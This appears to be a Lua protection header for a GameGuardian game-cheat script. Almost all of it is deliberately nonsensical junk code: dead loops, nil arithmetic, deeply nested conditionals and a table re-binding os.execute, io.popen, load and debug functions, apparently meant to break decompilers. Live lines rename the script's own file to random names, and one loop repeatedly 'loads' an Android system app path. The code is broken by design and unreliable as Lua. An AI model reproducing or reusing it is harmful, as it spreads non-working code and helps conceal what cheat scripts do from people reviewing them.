while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|nil|false|nil|w|nil|false|true|nil)(w)end;return(true|false|nil)end;return;end
for i = 1, 0 do local RR = {} local R = {} R.R = {} R.RRR = RR.Z() R.RRR = R.RRR:Z() R.R[B] = R[Z] end
for Saria = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil),(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) _ST_125 = _ST_125(_ST_125nil_ST_125nil)(_ST_125) if _~= nil then  	_ = _ (-nil * nil)() 	_ = nil end _ = _,_(-nil*nil),_ if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil*nil*-nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end if nil ~= nil then _Erro = (-nil)((-nil)[nil] | nil | nil) _Block = _Erro _Block = _Block() while (nil) do _Block() end if _Block ~= nil then do for i = 0,1,0 do _SSTools = _Noob(Noob) _SSTools = _SSToolsnil _SSTools= _Noob(Noob):_SSTools(_SSToolsnil)(_SSToolsnil*-1).._SSToolsnil _SSTools = _SSTools(_SSToolsnil)(_SSTools) end for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _ST_125 = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _ST_125 = _ST_125() _ST_125 = _ST_125nil _ST_125= _ST_125():_ST_125(_ST_125nil)(_ST_125nil*-1).._ST_125nil _ST_125 = _ST_125(_ST_125nil)(_ST_125) if _ST_125  ~= nil then _ST_125 = _ (_ST_125nil*nil) _ST_125 = nil end if _ST_125 == nil then   _ST_125 = {_ST_125(_ST_125*nil)(_ST_125*nil)(nil * 1, 1  << nil), _ST_125*nil} end end local _Erro = {} Saria[''] = T local K = (Saria)(Saria, Saria) K[1] = 1 end
local Saria = {} Saria[''] = Saria local t = (Saria)(Saria, Saria) t[1] = 1 end _ = {_, _(-nil)(-nil)(nil * 3, 0  << nil), -nil} _ = _ (nil) _ = -nil _ = _ (-nil * nil)() _SSTools = _SSTools ( _) _SSTools = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _SSTools = _Noob(Noob) if _SSTools == nil then _SSTools = {_SSTools(_SSTools*nil)(_SSTools*nil)(nil * 3, 0  << nil), _SSTools*nil} end while _Block ~= _SSTools do if _Erro ~= _SSTools then do _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob)_Noob(Noob) _Noob(Noob) _Noob(Noob) _Noob(Noob) end end end end end while _Block ~= nil do _SSTools = nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil,nil end
for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;for i = 1,0 do; local xnxx = {} if xnxx.i ~= nil then xnxx.i=xnxx.i() end;end;
while nil ~=nil do;local a = {} a.a = nil,nil,nil,nil if (a.a)then;a.a=(a.a(a)) a.a=(a.a(a))end;end;while (nil)do;local b={} local c={} local d={}if (b.b) then if (b.b.b) then if (b.b.b.b) then if (b.b.b.b.b) then if (c.c) then if (c.c.c) then if (c.c.c.c) then if (d.d) then if (d.d.d) then if (d.d.d.d) then;b.b = (b.b(b)) b.b=(b.b(b.b.b(b.b(b)))) c.c = (c.c(c)) c.c=(c.c(c.c.c(c.c.c.c(c.c.c(c.c(c.c)))))) d.d = (d.d(d.d.d(d.d.d.d(d.d.d(d.d(d.d)))))) local e = {b.b,c.c,d.d} e.e = e[1]..e[2]..e[3] e.i = e.e(e.e(e.e(e.e(e.e(e.e(e.e)))))) end;end;end;end;end;end;end;end;end;end;end;while(nil)do;local w={}if(w.w)then;w.w=(w.w(w))end;end;while(nil)do;for w=w,w do;local w={}if(w.w)then;w.w=w.w(w)end;for ww=w.w,w.w,w.w do;local ww={}if(ww.w)then;ww.w=ww.w()end;for www=w,ww.w,w do;local www={}if(www.w)then;www.w=www.w(w)end;for wwww=w,ww,www.w do;local wwww={}if(wwww.w)then;wwww.w=wwww.w(w)end;local wwww={}if(wwww.w)then;wwww.w=(wwww|www|ww|w)(w)end;end;local www={}if(www.w)then;www.w=(true|www|ww|w)(w)end;end;local ww={}if(ww.w)then;ww.w=(true|false|ww|w)(w)end;end;local w={}if(w.w)then;w.w=(true|false|nil|w)(w)end;return(true|false|nil)end;return;end;while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[L] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[H] = X[L] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman.games() zzzzz.fullnick = zzzzz.Batman.Loader() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.No.Partner() end end;while (nil)do;local w={}if (w.w)then if (w.w.w)then;w.w=(w.w(w)) w.w=(w.w(w.w.w(w.w(w))))end;end;end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
for i = 1,5 do
local ii = i * i local iii = i / i local iiii = i + i local iiiii = i - i
local _ = i * ii * iii * iiii * iiiii local __ = i / ii / iii / iiii / iiiii local ___ = i + ii + iii + iiii + iiiii local ____ = i - ii - iii - iiii - iiiii local _____ = _ * __ * ___ * ____ / _ / __ / ___ / ____ + _ + __ + ___ + ____ - _ - __ - ___ - ____ local ssenl = load(_____) if load(_____) then ssenl() pcall(ssenl) load(_____)() ssenl().ssenl() else load(_____)  end
end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
for x =0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil  _  = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _~= nil then   _ = _ (-nil * nil)()  _ = nil end  if _  == nil then  _ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil} end end local x = {} x[''] = x local t = (x)(x, x) t[1] = 1 end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
while(nil)do;local i={}if(i.i)then;i.i=(i.i(i))end;end
function ST() local NN = {} local N = {} N.N = {} N.NNN = NN.G() N.NNN = N.NNN:G() N.N[T] = N[G]  end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
